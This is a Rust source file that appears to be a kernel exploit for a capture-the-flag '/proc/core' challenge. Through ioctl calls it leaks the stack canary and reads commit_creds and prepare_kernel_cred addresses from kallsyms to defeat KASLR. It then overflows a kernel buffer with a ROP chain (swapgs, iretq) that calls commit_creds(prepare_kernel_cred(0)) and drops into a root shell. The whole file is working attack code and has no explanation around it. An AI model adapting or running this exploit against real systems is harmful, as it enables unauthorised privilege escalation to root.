use anyhow::{self, Context};
use colored::*;
use core::arch::asm;
use std::fs::OpenOptions;
use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::io::{BufRead, BufReader};
use std::os::fd::AsRawFd;

const SWAPGS_POPFQ_RET: u64 = 0xffffffff81a012da;
const IRETQ: u64 = 0xffffffff813eb448;
static mut commit_creds: u64 = 0;
static mut prepare_kernel_cred: u64 = 0;
fn save_status() -> (u64, u64, u64, u64) {
    let mut user_cs: u64;
    let mut user_ss: u64;
    let mut user_sp: u64;
    let mut user_rflags: u64;
    unsafe {
        asm! {
            "mov {user_cs}, cs",
            "mov {user_ss}, ss",
            "mov {user_sp}, rsp",
            "pushf",
            "pop {user_rflags}",
            user_cs = out(reg) user_cs,
            user_ss = out(reg) user_ss,
            user_sp = out(reg) user_sp,
            user_rflags = out(reg) user_rflags,

        };
    }
    (user_cs, user_ss, user_sp, user_rflags)
}

fn getRootShell() {
    if unsafe { libc::getuid() } != 0 {
        eprintln!("{}", "[x] Failed to get the root!".blue().bold());
        std::process::exit(-1);
    }
    println!(
        "Successful to get the root.\n
         Execve root shell now..."
    );
    std::process::Command::new("/bin/sh")
        .status()
        .expect("failed to execute process");
}

fn core_read(fd: i32, buf: &mut [u64]) -> anyhow::Result<()> {
    match unsafe { libc::ioctl(fd, 0x6677889B, buf.as_mut_ptr()) } {
        -1 => Err(anyhow::Error::new(io::Error::last_os_error()).context("core_read执行失败")),
        _ => {
            println!("{}", "core_read成功执行".red().bold());
            Ok(())
        }
    }
}

fn set_off_value(fd: i32, off: u64) -> anyhow::Result<()> {
    match unsafe { libc::ioctl(fd, 0x6677889C, off) } {
        -1 => {
            Err(anyhow::Error::new(io::Error::last_os_error())
                .context("set_off_value 没能成功执行"))
        }
        _ => {
            println!("{}", "set_off_value成功执行".red().bold());
            Ok(())
        }
    }
}
fn core_copy_func(fd: i32, nbytes: u64) -> anyhow::Result<()> {
    match unsafe { libc::ioctl(fd, 0x6677889A, nbytes) } {
        -1 => {
            let err = io::Error::last_os_error();
            Err(anyhow::Error::new(err).context("core_copy_func 调用失败"))
        }
        _ => {
            println!("{}", "core_copy_func成功执行".red().bold());
            Ok(())
        }
    }
}

fn getRootPrivilige() {
    unsafe {
        let commit_creds_: fn(*const ()) -> i32 = std::mem::transmute(commit_creds);
        let prepare_kernel_cred_: fn(*const ()) -> *const () =
            std::mem::transmute(prepare_kernel_cred);
        commit_creds_(prepare_kernel_cred_(std::ptr::null()));
    }
}

fn main() -> anyhow::Result<()> {
    println!("{}", "[*] Start to exploit...".blue().bold());
    let (user_cs, user_ss, user_sp, user_rflags) = save_status();

    let fd = OpenOptions::new()
        .write(true) //
        .open("/proc/core")?;
    let sym_table_fd = File::open("/tmp/kallsyms")?;
    let reader = BufReader::new(sym_table_fd);
    let fd_num = fd.as_raw_fd();
    let mut commit_creds_ptr: Option<fn(*const ()) -> i32> = None;
    let mut prepare_kernel_cred_ptr: Option<fn(*const ()) -> *const ()> = None;
    for line in reader.lines() {
        let line = line?;

        let mut parts = line.split_whitespace();

        if let (Some(addr), Some(_type), Some(buf)) = (
            parts.next().and_then(|s| u64::from_str_radix(s, 16).ok()),
            parts.next(),
            parts.next(),
        ) {
            if commit_creds_ptr.is_none() && buf == "commit_creds" {
                commit_creds_ptr =
                    Some(unsafe { std::mem::transmute::<u64, fn(*const ()) -> i32>(addr) });
                println!(
                    "{}{}",
                    "Successful to get the addr of commit_cred:".blue().bold(),
                    format!("{:p}", commit_creds_ptr.unwrap()).blue().bold()
                );
                continue;
            }
            if prepare_kernel_cred_ptr.is_none() && buf == "prepare_kernel_cred" {
                prepare_kernel_cred_ptr =
                    Some(unsafe { std::mem::transmute::<u64, fn(*const ()) -> *const ()>(addr) });
                println!(
                    "{}{}",
                    "Successful to get the addr of prepare_kernel_cred:"
                        .blue()
                        .bold(),
                    format!("{:p}", prepare_kernel_cred_ptr.unwrap())
                        .blue()
                        .bold()
                );
                continue;
            }
        }
    }
    let offset = unsafe {
        commit_creds = commit_creds_ptr.unwrap() as u64;
        prepare_kernel_cred = prepare_kernel_cred_ptr.unwrap() as u64;
        commit_creds - 0xffffffff8109c8e0
    };
    set_off_value(fd_num, 64)?;
    let mut buf: Vec<u64> = vec![0; 100];
    core_read(fd_num, &mut buf)?;
    let canary = buf[0];
    println!("canary is 0x{:x}", canary);
    let mut rop_chain: Vec<u64> = vec![0; 100];
    for i in 0..10 {
        rop_chain[i] = canary;
    }
    let values_to_insert = vec![
        getRootPrivilige as u64,
        SWAPGS_POPFQ_RET + offset,
        0,
        IRETQ + offset,
        getRootShell as u64,
        user_cs,
        user_rflags,
        user_sp,
        user_ss,
    ];

    rop_chain.splice(10..10, values_to_insert);

    let write_result = unsafe {
        println!("fd_num = {}", fd_num);
        libc::write(
            fd_num,
            rop_chain.as_mut_ptr() as *const libc::c_void,
            rop_chain.len() * std::mem::size_of::<u64>(),
        )
    };

    if write_result == -1 {
        let err = io::Error::last_os_error();
        println!("Error writing to file descriptor: {}", err);
    } else {
        println!("Successfully wrote {} bytes", write_result);
    }

    core_copy_func(fd_num, 0xffffffffffff0000 | (0x100))?;

    Ok(())
}
